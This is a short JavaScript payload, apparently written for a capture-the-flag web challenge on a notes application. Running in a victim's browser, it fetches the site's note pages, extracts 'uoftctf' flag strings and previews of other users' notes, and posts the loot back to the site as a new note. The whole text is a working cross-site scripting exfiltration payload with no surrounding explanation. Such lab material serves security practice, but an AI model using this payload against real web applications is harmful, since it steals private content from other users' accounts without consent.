fetch('/').then(function(r){ return r.text(); }).then(function(h){
  var notes = h.match(/\/note\/[a-f0-9]+/g) || [];
  var unique = [];
  notes.forEach(function(n){ if(unique.indexOf(n)===-1) unique.push(n); });
  var current = location.pathname;
  var others = unique.filter(function(n){ return n !== current; });
  
  Promise.all(others.map(function(n){ 
    return fetch(n).then(function(r){ return r.text(); }).catch(function(){ return ''; });
  })).then(function(pages){
    var allText = pages.join('\n');
    var flags = allText.match(/uoftctf\{[^}]+\}/g) || [];
    
    // Also search in raw text without HTML
    var textContent = allText.replace(/<[^>]+>/g, ' ');
    var moreFlags = textContent.match(/uoftctf\{[^}]+\}/g) || [];
    flags = flags.concat(moreFlags);
    
    // Get unique flags
    var uniqueFlags = [];
    flags.forEach(function(f){ if(uniqueFlags.indexOf(f)===-1) uniqueFlags.push(f); });
    
    // Also grab first 3000 chars of each page for manual review
    var preview = pages.map(function(p, i){ 
      return 'NOTE' + i + ':' + p.substring(0, 1000); 
    }).join('\n---\n');
    
    var result = 'FLAGS:' + (uniqueFlags.length ? uniqueFlags.join(',') : 'NONE') + '\n\nPREVIEW:\n' + preview.substring(0, 4000);
    
    fetch('/note/new', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'title=CONTENT&body=' + encodeURIComponent(result)
    });
  });
});
